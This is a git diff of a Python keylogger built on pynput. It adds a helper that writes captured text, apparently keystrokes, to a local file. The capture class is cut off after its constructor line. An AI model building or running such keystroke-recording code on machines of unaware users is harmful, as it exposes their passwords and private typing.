@@ -1,6 +1,7 @@
 from sys import implementation
 from pynput.keyboard import Listener, Controller
 import threading
+import logging
 
 KeyMap = {"space": " ",
           "enter": "\n",
@@ -8,6 +9,15 @@ KeyMap = {"space": " ",
           "ctrl_r": "",
           "ctrl_l": "",
           "backspace": ""}
+
+def create_file_logger(filename):
+    logger= logging.getLogger()
+    logger.setLevel(logging.INFO)
+    handler = logging.FileHandler(filename, 'w', 'utf-8')
+    handler.setFormatter(logging.Formatter('%(message)s')) 
+    handler.terminator = ""
+    logger.addHandler(handler)
+    return logger
 
 class KeyLogger(Listener):
     def __init__(self):
